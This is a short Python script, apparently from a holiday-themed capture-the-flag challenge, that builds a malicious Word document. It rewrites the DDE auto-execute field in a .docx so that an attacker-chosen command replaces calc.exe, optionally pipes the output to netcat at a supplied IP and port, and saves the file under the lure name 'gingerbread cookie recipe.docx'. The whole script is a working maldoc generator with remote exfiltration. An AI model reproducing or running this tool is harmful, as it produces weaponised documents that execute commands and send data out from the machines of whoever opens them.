#!/usr/bin/env python
import os
import subprocess
import shutil
import zipfile

def extract_dde(data):
    dde_index = data.index(b"DEAUTO")
    dde_end = data.index(b"<", dde_index)
    return data[dde_index:dde_end]

def rewrite_dde(data, command, ip, port):
    if ip and port:
        command = "{} | nc {} {}".format(command, ip, port)
    command = command.encode("utf-8")

    print("Before:")
    print(extract_dde(data).decode('ascii'))

    data = data.replace(b"calc.exe", command)
    print("After:")
    print(extract_dde(data).decode('ascii'))

    return data

def repack(
    input="../support_files/FileStore/MEMO - Calculator Access for Wunorse.docx",
    output="../output/gingerbread cookie recipe.docx",
    command="dir C:\\",
    ip=None,
    port=None
    ):

    input = os.path.realpath(input)
    output = os.path.realpath(output)
    outtmp =  output + ".tmp"

    with zipfile.ZipFile(input, 'r') as zipread, zipfile.ZipFile(outtmp, 'w') as zipwrite:
        for item in zipread.infolist():
            data = zipread.read(item.filename)
            if item.filename == "word/document.xml":
                print("Found word/document.xml, rewriting {} bytes".format(len(data)))
                data = rewrite_dde(data, command, ip, port)
            zipwrite.writestr(item, data)
    os.rename(outtmp, output)

if __name__ == "__main__":
    repack()
